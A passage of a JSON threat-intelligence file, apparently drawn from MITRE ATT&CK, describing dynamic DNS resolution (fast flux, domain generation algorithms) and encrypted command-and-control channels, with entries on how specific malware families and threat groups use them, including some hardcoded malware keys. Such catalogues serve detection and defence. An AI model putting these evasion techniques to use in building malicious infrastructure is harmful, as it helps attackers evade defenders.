                "Name": "TrailBlazer",
                "Description": "malware can masquerade its C2 traffic as legitimate Google Notifications HTTP requests.[10]"
            }
        }
    },
    "T1568": {
        "ttp_name": "Dynamic Resolution",
        "ttp_id": "T1568",
        "href": "/techniques/T1568",
        "subtechnique": {
            "001": {
                "name": "Fast Flux DNS",
                "href": "/techniques/T1568/001",
                "description": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.[1][2][3]The simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.[3]In contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",
                "Procedure": {
                    "S1025": {
                        "ID": "S1025",
                        "Name": "Amadey",
                        "Description": "<name> has used fast flux DNS for its C2.[4]"
                    },
                    "S0032": {
                        "ID": "S0032",
                        "Name": "gh0st RAT",
                        "Description": "<name> operators have used dynamic DNS to mask the true location of their C2 behind rapidly changing IP addresses.[5]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used dynamic DNS service providers to host malicious domains.[6]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> has used a fast flux DNS for C2 IP resolution.[7]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used fast flux to mask botnets by distributing payloads across multiple IPs.[8]"
                    }
                }
            },
            "002": {
                "name": "Domain Generation Algorithms",
                "href": "/techniques/T1568/002",
                "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.[1][2][3]DGAs can take the form of apparently random or \"gibberish\" strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.[1][2][4][5]Adversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.[4][6][7]",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> has used DGAs to change their C2 servers monthly.[8]"
                    },
                    "S0456": {
                        "ID": "S0456",
                        "Name": "Aria-body",
                        "Description": "<name> has the ability to use a DGA for C2 communications.[9]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> has used a DGA in C2 communications.[10]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can implement DGA using the current date as a seed variable.[11]"
                    },
                    "S0360": {
                        "ID": "S0360",
                        "Name": "BONDUPDATER",
                        "Description": "<name> uses a DGA to communicate with command and control servers.[12]"
                    },
                    "S0222": {
                        "ID": "S0222",
                        "Name": "CCBkdr",
                        "Description": "<name> can use a DGA for Fallback Channels if communications with the primary command and control server are lost.[4]"
                    },
                    "S0023": {
                        "ID": "S0023",
                        "Name": "CHOPSTICK",
                        "Description": "<name> can use a DGA for Fallback Channels, domains are generated by concatenating words from lists.[7]"
                    },
                    "S0608": {
                        "ID": "S0608",
                        "Name": "Conficker",
                        "Description": "<name> has used a DGA that seeds with the current UTC victim system date to generate domains.[13][14]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> has used a DGA to generate a domain name for C2.[15]"
                    },
                    "S0600": {
                        "ID": "S0600",
                        "Name": "Doki",
                        "Description": "<name> has used the DynDNS service and a DGA based on the Dogecoin blockchain to generate C2 domains.[16]"
                    },
                    "S0377": {
                        "ID": "S0377",
                        "Name": "Ebury",
                        "Description": "<name> has used a DGA to generate a domain name for C2.[17][18]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can use a DGA for hiding C2 addresses, including use of an algorithm with a user-specific key that changes daily.[19][20]"
                    },
                    "S1015": {
                        "ID": "S1015",
                        "Name": "Milan",
                        "Description": "<name> can use hardcoded domains as an input for domain generation algorithms.[21]"
                    },
                    "S0051": {
                        "ID": "S0051",
                        "Name": "MiniDuke",
                        "Description": "<name> can use DGA to generate new Twitter URLs for C2.[22]"
                    },
                    "S0508": {
                        "ID": "S0508",
                        "Name": "ngrok",
                        "Description": "<name> can provide DGA for C2 servers through the use of random URL strings that change every 12 hours.[23]"
                    },
                    "S0150": {
                        "ID": "S0150",
                        "Name": "POSHSPY",
                        "Description": "<name> uses a DGA to derive command and control URLs from a word list.[6]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can use domain generation algorithms in C2 communication.[24]"
                    },
                    "S0596": {
                        "ID": "S0596",
                        "Name": "ShadowPad",
                        "Description": "<name> uses a DGA that is based on the day of the month for C2 servers.[25][26][8]"
                    },
                    "S1019": {
                        "ID": "S1019",
                        "Name": "Shark",
                        "Description": "<name> can send DNS C2 communications using a unique domain generation algorithm.[27][21]"
                    },
                    "S0615": {
                        "ID": "S0615",
                        "Name": "SombRAT",
                        "Description": "<name> can use a custom DGA to generate a subdomain for C2.[28]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has used a DGA to generate URLs from executed macros.[29][30]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has used a DGA to generate domain names for C2.[31]"
                    }
                }
            },
            "003": {
                "name": "DNS Calculation",
                "href": "/techniques/T1568/003",
                "description": "Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.[1]One implementation of DNS Calculation is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.[1][2][3]",
                "Procedure": {
                    "G0005": {
                        "ID": "G0005",
                        "Name": "APT12",
                        "Description": "<name> has used multiple variants of DNS Calculation including multiplying the first two octets of an IP address and adding the third octet to that value in order to get a resulting command and control port.[1]"
                    }
                }
            }
        },
        "tactic": "Command and Control",
        "description": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.Adversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.[1][2][3]",
        "Procedure": {
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has used Dynamic DNS providers for their malware C2 infrastructure.[4]"
            },
            "S1087": {
                "ID": "S1087",
                "Name": "AsyncRAT",
                "Description": "malware can be configured to use dynamic DNS.[5]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware has used a dynamic DNS service for C2.[6]"
            },
            "G1002": {
                "ID": "G1002",
                "Name": "BITTER",
                "Description": "malware has used DDNS for C2 communications.[7]"
            },
            "C0026": {
                "ID": "C0026",
                "Name": "C0026",
                "Description": "During malware, the threat actors re-registered a ClouDNS dynamic DNS subdomain which was previously used by ANDROMEDA.[8]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has incorporated dynamic DNS domains in its infrastructure.[9]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can use dynamic DNS domain names in C2.[10]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has forged POST strings with a random choice from a list of possibilities including \"forum\", \"php\", \"view\", etc. while making connection with the C2, hindering detection efforts.[11]"
            },
            "S0034": {
                "ID": "S0034",
                "Name": "NETEAGLE",
                "Description": "malware can use HTTP to download resources that contain an IP address and port number pair to connect to for C2.[12]"
            },
            "C0002": {
                "ID": "C0002",
                "Name": "Night Dragon",
                "Description": "During malware, threat actors used dynamic DNS services for C2.[13]"
            },
            "C0016": {
                "ID": "C0016",
                "Name": "Operation Dust Storm",
                "Description": "For malware, the threat actors used dynamic DNS domains from a variety of free providers, including No-IP, Oray, and 3322.[14]"
            },
            "C0005": {
                "ID": "C0005",
                "Name": "Operation Spalax",
                "Description": "For malware, the threat actors used dynamic DNS services, including Duck DNS and DNS Exit, as part of their C2 infrastructure.[15]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware has resolved Pony C2 server IP addresses by either converting Bitcoin blockchain transaction data to specific octets, or accessing IP addresses directly within the Namecoin blockchain.[16][17]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.[18]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware dynamically resolved C2 infrastructure for randomly-generated subdomains within a parent domain.[19]"
            },
            "G1018": {
                "ID": "G1018",
                "Name": "TA2541",
                "Description": "malware has used dynamic DNS services for C2 infrastructure.[20]"
            },
            "S0671": {
                "ID": "S0671",
                "Name": "Tomiris",
                "Description": "malware has connected to a signalization server that provides a URL and port, and then malware sends a GET request to that URL to establish C2.[21]"
            },
            "G0134": {
                "ID": "G0134",
                "Name": "Transparent Tribe",
                "Description": "malware has used dynamic DNS services to set up C2.[22]"
            }
        }
    },
    "T1573": {
        "ttp_name": "Encrypted Channel",
        "ttp_id": "T1573",
        "href": "/techniques/T1573",
        "subtechnique": {
            "001": {
                "name": "Symmetric Cryptography",
                "href": "/techniques/T1573/001",
                "description": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
                "Procedure": {
                    "S0066": {
                        "ID": "S0066",
                        "Name": "3PARA RAT",
                        "Description": "<name> command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS. <name> will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS if the DES decoding fails[1]"
                    },
                    "S0065": {
                        "ID": "S0065",
                        "Name": "4H RAT",
                        "Description": "<name> obfuscates C2 communication using a 1-byte XOR with the key 0xBE.[1]"
                    },
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "A variant of <name> encrypts some C2 with 3DES.[2]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> installed a Delphi backdoor that used a custom algorithm for C2 communications.[3]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used AES for encryption of command and control traffic.[4]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name> has encrypted data symmetrically using a randomly generated Blowfish (OFB) key which is encrypted with a public RSA key.[5]"
                    },
                    "S0344": {
                        "ID": "S0344",
                        "Name": "Azorult",
                        "Description": "<name> can encrypt C2 traffic using XOR.[6][7]"
                    },
                    "S0245": {
                        "ID": "S0245",
                        "Name": "BADCALL",
                        "Description": "<name> encrypts C2 traffic using an XOR/ADD cipher.[8]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> encrypts C2 data with a ROR by 3 and an XOR by 0x23.[9][10]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> has used AES encryption for C2 communication.[11]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can send C2 communications with XOR encryption.[12]"
                    },
                    "S0127": {
                        "ID": "S0127",
                        "Name": "BBSRAT",
                        "Description": "<name> uses a custom encryption algorithm on data sent back to the C2 server over HTTP.[13]"
                    },
                    "S0574": {
                        "ID": "S0574",
                        "Name": "BendyBear",
                        "Description": "<name> communicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks.[14]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> variants reported on in 2014 and 2015 used a simple XOR cipher for C2. Some <name> samples encrypt C2 communications with RC4.[15][16][17]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has encrypted its C2 traffic with RC4.[18]"
                    },
                    "S0486": {
                        "ID": "S0486",
                        "Name": "Bonadan",
                        "Description": "<name> can XOR-encrypt C2 communications.[19]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic. <name> has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.[20]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> can encrypt C2 requests and responses with RC4[21]"
                    },
                    "S0077": {
                        "ID": "S0077",
                        "Name": "CallMe",
                        "Description": "<name> uses AES to encrypt C2 traffic.[22]"
                    },
                    "S0030": {
                        "ID": "S0030",
                        "Name": "Carbanak",
                        "Description": "<name> encrypts the message body of HTTP traffic with RC2 (in CBC mode). <name> also uses XOR with random keys for its communications.[23][24]"
                    },
                    "S0348": {
                        "ID": "S0348",
                        "Name": "Cardinal RAT",
                        "Description": "<name> uses a secret key with a series of XOR and addition operations to encrypt C2 traffic.[25]"
                    },
                    "S0220": {
                        "ID": "S0220",
                        "Name": "Chaos",
                        "Description": "<name> provides a reverse shell connection on 8338/TCP, encrypted via AES.[26]"
                    },
                    "S0674": {
                        "ID": "S0674",
                        "Name": "CharmPower",
                        "Description": "<name> can send additional modules over C2 encrypted with a simple substitution cipher.[27]"
                    },
                    "S0144": {
                        "ID": "S0144",
                        "Name": "ChChes",
                        "Description": "<name> can encrypt C2 traffic with AES or RC4.[28][29]"
                    },
                    "S0023": {
                        "ID": "S0023",
                        "Name": "CHOPSTICK",
                        "Description": "<name> encrypts C2 communications with RC4.[30]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> has the ability to use AES-256 symmetric encryption in CBC mode with HMAC-SHA-256 to encrypt task commands and XOR to encrypt shell code and configuration data.[31]"
                    },
                    "S0244": {
                        "ID": "S0244",
                        "Name": "Comnie",
                        "Description": "<name> encrypts command and control communications with RC4.[32]"
                    },
                    "S0137": {
                        "ID": "S0137",
                        "Name": "CORESHELL",
                        "Description": "<name> C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.[33]"
                    },
                    "S0050": {
                        "ID": "S0050",
                        "Name": "CosmicDuke",
                        "Description": "<name> contains a custom version of the RC4 algorithm that includes a programming error.[34]"
                    },
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> has used AES-256 and 3DES for C2 communications.[35]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "<name> uses RC4 encryption to obfuscate HTTP traffic.[20]"
                    },
                    "S0021": {
                        "ID": "S0021",
                        "Name": "Derusbi",
                        "Description": "<name> obfuscates C2 traffic with variable 4-byte XOR keys.[36]"
                    },
                    "S0200": {
                        "ID": "S0200",
                        "Name": "Dipsind",
                        "Description": "<name> encrypts C2 data with AES256 in ECB mode.[37]"
                    },
                    "S0472": {
                        "ID": "S0472",
                        "Name": "down_new",
                        "Description": "<name> has the ability to AES encrypt C2 communications.[38]"
                    },
                    "S0134": {
                        "ID": "S0134",
                        "Name": "Downdelph",
                        "Description": "<name> uses RC4 to encrypt C2 responses.[39]"
                    },
                    "S0384": {
                        "ID": "S0384",
                        "Name": "Dridex",
                        "Description": "<name> has encrypted traffic with RC4.[40]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "The <name> command and control protocol's data stream can be encrypted with AES-CBC.[41]"
                    },
                    "S0377": {
                        "ID": "S0377",
                        "Name": "Ebury",
                        "Description": "<name> has encrypted C2 traffic using the client IP address, then encoded it as a hexadecimal string.[42]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "<name> encrypts exfiltrated data with RC4.[43]"
                    },
                    "S0082": {
                        "ID": "S0082",
                        "Name": "Emissary",
                        "Description": "The C2 server response to a beacon sent by a variant of <name> contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of <name> use various XOR operations to encrypt C2 data.[44]"
                    },
                    "S0091": {
                        "ID": "S0091",
                        "Name": "Epic",
                        "Description": "<name> encrypts commands from the C2 server using a hardcoded key.[45]"
                    },
                    "S0569": {
                        "ID": "S0569",
                        "Name": "Explosive",
                        "Description": "<name> has encrypted communications with the RC4 method.[46]"
                    },
                    "S0076": {
                        "ID": "S0076",
                        "Name": "FakeM",
                        "Description": "The original variant of <name> encrypts C2 traffic using a custom encryption cipher that uses an XOR key of \"YHCRA\" and bit rotation between each XOR operation. Some variants of <name> use RC4 to encrypt C2 traffic.[22]"
                    },
                    "S0181": {
                        "ID": "S0181",
                        "Name": "FALLCHILL",
                        "Description": "<name> encrypts C2 data with RC4 encryption.[47][48]"
                    },
                    "S0512": {
                        "ID": "S0512",
                        "Name": "FatDuke",
                        "Description": "<name> can AES encrypt C2 communications.[49]"
                    },
                    "S0171": {
                        "ID": "S0171",
                        "Name": "Felismus",
                        "Description": "Some <name> samples use a custom encryption method for C2 traffic that utilizes AES and multiple keys.[50]"
                    },
                    "S0381": {
                        "ID": "S0381",
                        "Name": "FlawedAmmyy",
                        "Description": "<name> has used SEAL encryption during the initial C2 handshake.[51]"
                    },
                    "S0661": {
                        "ID": "S0661",
                        "Name": "FoggyWeb",
                        "Description": "<name> has used a dynamic XOR key and custom XOR methodology for C2 communications.[52]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors communicated with C2 via an encrypted RC4 byte stream and AES-CBC.[53]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> uses custom encryption for C2 that uses 3DES.[54][55]"
                    },
                    "S0032": {
                        "ID": "S0032",
                        "Name": "gh0st RAT",
                        "Description": "<name> uses RC4 and XOR to encrypt C2 traffic.[56]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> encrypts communications using AES256.[57]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> can use an AES key to encrypt C2 communications.[58]"
                    },
                    "S0132": {
                        "ID": "S0132",
                        "Name": "H1N1",
                        "Description": "<name> encrypts C2 traffic using an RC4 key.[59]"
                    },
                    "S0037": {
                        "ID": "S0037",
                        "Name": "HAMMERTOSS",
                        "Description": "Before being appended to image files, <name> commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.[60]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "<name> encrypts data sent to its C2 server over HTTP with RC4.[61]"
                    },
                    "S0087": {
                        "ID": "S0087",
                        "Name": "Hi-Zor",
                        "Description": "<name> encrypts C2 traffic with a double XOR using two distinct single-byte keys.[62]"
                    },
                    "S0394": {
                        "ID": "S0394",
                        "Name": "HiddenWasp",
                        "Description": "<name> uses an RC4-like algorithm with an already computed PRGA generated key-stream for network communication.[63]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> used AES-128 to encrypt C2 traffic.[64]"
                    },
                    "S0009": {
                        "ID": "S0009",
                        "Name": "Hikit",
                        "Description": "<name> performs XOR encryption.[65]"
                    },
                    "S0431": {
                        "ID": "S0431",
                        "Name": "HotCroissant",
                        "Description": "<name> has compressed network communications and encrypted them with a custom stream cipher.[66][67]"
                    },
                    "S0068": {
                        "ID": "S0068",
                        "Name": "httpclient",
                        "Description": "<name> encrypts C2 content with XOR using a single byte, 0x12.[1]"
                    },
                    "S0203": {
                        "ID": "S0203",
                        "Name": "Hydraq",
                        "Description": "<name> C2 traffic is encrypted using bitwise NOT and XOR operations.[68]"
                    },
                    "S0537": {
                        "ID": "S0537",
                        "Name": "HyperStack",
                        "Description": "<name> has used RSA encryption for C2 communications.[69]"
                    },
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "The <name> Result Retriever module can AES encrypt C2 responses.[70]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> has encrypted network communications with AES.[71]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> uses variations of a simple XOR encryption routine for C&C communications.[72]"
                    },
                    "S0271": {
                        "ID": "S0271",
                        "Name": "KEYMARBLE",
                        "Description": "<name> uses a customized XOR algorithm to encrypt C2 communications.[73]"
                    },
                    "S0641": {
                        "ID": "S0641",
                        "Name": "Kobalos",
                        "Description": "<name>'s post-authentication communication channel uses a 32-byte-long password with RC4 for inbound and outbound traffic.[74][75]"
                    },
                    "S0162": {
                        "ID": "S0162",
                        "Name": "Komplex",
                        "Description": "The <name> C2 channel uses an 11-byte XOR algorithm to hide data.[76]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has used AES to encrypt C2 traffic.[77]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "Several <name> malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another <name> malware sample XORs C2 traffic. Other <name> malware uses Caracachs encryption to encrypt C2 payloads. <name> has also used AES to encrypt C2 traffic.[78][79][80][81]"
                    },
                    "S0395": {
                        "ID": "S0395",
                        "Name": "LightNeuron",
                        "Description": "<name> uses AES to encrypt C2 traffic.[82]"
                    },
                    "S1119": {
                        "ID": "S1119",
                        "Name": "LIGHTWIRE",
                        "Description": "<name> can RC4 encrypt C2 commands.[83]"
                    },
                    "S0582": {
                        "ID": "S0582",
                        "Name": "LookBack",
                        "Description": "<name> uses a modified version of RC4 for data transfer.[84]"
                    },
                    "S0532": {
                        "ID": "S0532",
                        "Name": "Lucifer",
                        "Description": "<name> can perform a decremental-xor encryption on the initial C2 request before sending it over the wire.[85]"
                    },
                    "S0010": {
                        "ID": "S0010",
                        "Name": "Lurid",
                        "Description": "<name> performs XOR encryption.[86]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> has used AES to exfiltrate documents.[87]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can encrypt its C2 traffic with RC4.[88]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> can encrypt the data that it sends and receives from the C2 server using an RC4 encryption algorithm.[88][89]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has encrypted C2 commands with AES-256.[90]"
                    },
                    "S1026": {
                        "ID": "S1026",
                        "Name": "Mongall",
                        "Description": "<name> has the ability to RC4 encrypt C2 communications.[91]"
                    },
                    "S0149": {
                        "ID": "S0149",
                        "Name": "MoonWind",
                        "Description": "<name> encrypts C2 traffic using RC4 with a static key.[92]"
                    },
                    "S0284": {
                        "ID": "S0284",
                        "Name": "More_eggs",
                        "Description": "<name> has used an RC4-based encryption method for its C2 communications.[93]"
                    },
                    "S0256": {
                        "ID": "S0256",
                        "Name": "Mosquito",
                        "Description": "<name> uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.[94]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used AES to encrypt C2 responses.[95]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has encrypted C2 communications with RC4.[96]"
                    },
                    "S0336": {
                        "ID": "S0336",
                        "Name": "NanoCore",
                        "Description": "<name> uses DES to encrypt the C2 traffic.[97]"
                    },
                    "S0272": {
                        "ID": "S0272",
                        "Name": "NDiskMonitor",
                        "Description": "<name> uses AES to encrypt certain information sent over its C2 channel.[10]"
                    },
                    "S0630": {
                        "ID": "S0630",
                        "Name": "Nebulae",
                        "Description": "<name> can use RC4 and XOR to encrypt C2 communications.[98]"
                    },
                    "S0034": {
                        "ID": "S0034",
                        "Name": "NETEAGLE",
                        "Description": "<name> will decrypt resources it downloads with HTTP requests by using RC4 with the key \"ScoutEagle.\"[99]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> can use AES encryption for C2 data transferred.[100]"
                    },
                    "S1106": {
                        "ID": "S1106",
                        "Name": "NGLite",
                        "Description": "<name> will use an AES encrypted channel for command and control purposes, in one case using the key WHATswrongwithUu.[101]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> can XOR and AES encrypt C2 messages.[102]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> uses AES to encrypt network traffic. The key can be hardcoded or negotiated with the C2 server in the registration phase. [103]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group used an AES key to communicate with their C2 server.[104]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> encrypts data sent back to the C2 using AES in CBC mode with a null initialization vector (IV) and a key sent from the server that is padded to 32 bytes.[105]"
                    },
                    "S0664": {
                        "ID": "S0664",
                        "Name": "Pandora",
                        "Description": "<name> has the ability to encrypt communications with D3DES.[106]"
                    },
                    "S1031": {
                        "ID": "S1031",
                        "Name": "PingPull",
                        "Description": "<name> can use AES, in cipher block chaining (CBC) mode padded with PKCS5, to encrypt C2 server communications.[107]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "<name> communications are RC4 encrypted.[108]"
                    },
                    "S0254": {
                        "ID": "S0254",
                        "Name": "PLAINTEE",
                        "Description": "<name> encodes C2 beacons using XOR.[109]"
                    },
                    "S0435": {
                        "ID": "S0435",
                        "Name": "PLEAD",
                        "Description": "<name> has used RC4 encryption to download modules.[110]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> can use RC4 encryption in C2 communications.[111]"
                    },
                    "S0012": {
                        "ID": "S0012",
                        "Name": "PoisonIvy",
                        "Description": "<name> uses the Camellia cipher to encrypt communications.[112]"
                    },
                    "S0371": {
                        "ID": "S0371",
                        "Name": "POWERTON",
                        "Description": "<name> has used AES for encrypting C2 traffic.[4]"
                    },
                    "S0113": {
                        "ID": "S0113",
                        "Name": "Prikormka",
                        "Description": "<name> encrypts some C2 traffic with the Blowfish cipher.[113]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can RC4 encrypt strings in C2 communication.[114]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "<name> uses AES with a hardcoded pre-shared key to encrypt network communication.[115][116][117]"
                    },
                    "S1076": {
                        "ID": "S1076",
                        "Name": "QUIETCANARY",
                        "Description": "<name> can RC4 encrypt C2 communications.[118]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> can use RC4 to encrypt C2 communications.[98]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> has used AES ciphertext to encode C2 communications.[119]"
                    },
                    "S0153": {
                        "ID": "S0153",
                        "Name": "RedLeaves",
                        "Description": "<name> has encrypted C2 traffic with RC4, previously using keys of 88888888 and babybear.[120]"
                    },
                    "S0433": {
                        "ID": "S0433",
                        "Name": "Rifdoor",
                        "Description": "<name> has encrypted command and control (C2) communications with a stream cipher.[66]"
                    },
                    "S0003": {
                        "ID": "S0003",
                        "Name": "RIPTIDE",
                        "Description": "APT12 has used the <name> RAT, which communicates over HTTP with a payload encrypted with RC4.[121]"
                    },
                    "S1078": {
                        "ID": "S1078",
                        "Name": "RotaJakiro",
                        "Description": "<name> encrypts C2 communication using a combination of AES, XOR, ROTATE encryption, and ZLIB compression.[122]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> encrypts C2 traffic with a custom RC4 variant.[123]"
                    },
                    "S0074": {
                        "ID": "S0074",
                        "Name": "Sakula",
                        "Description": "<name> encodes C2 traffic with single-byte XOR keys.[124]"
                    },
                    "S1099": {
                        "ID": "S1099",
                        "Name": "Samurai",
                        "Description": "<name> can encrypt C2 communications with AES.[102]"
                    },
                    "S1085": {
                        "ID": "S1085",
                        "Name": "Sardonic",
                        "Description": "<name> has the ability to use an RC4 key to encrypt communications to and from actor-controlled C2 servers.[125]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "<name> C2 traffic has been encrypted with RC4 and AES.[126][127]"
                    },
                    "S0610": {
                        "ID": "S0610",
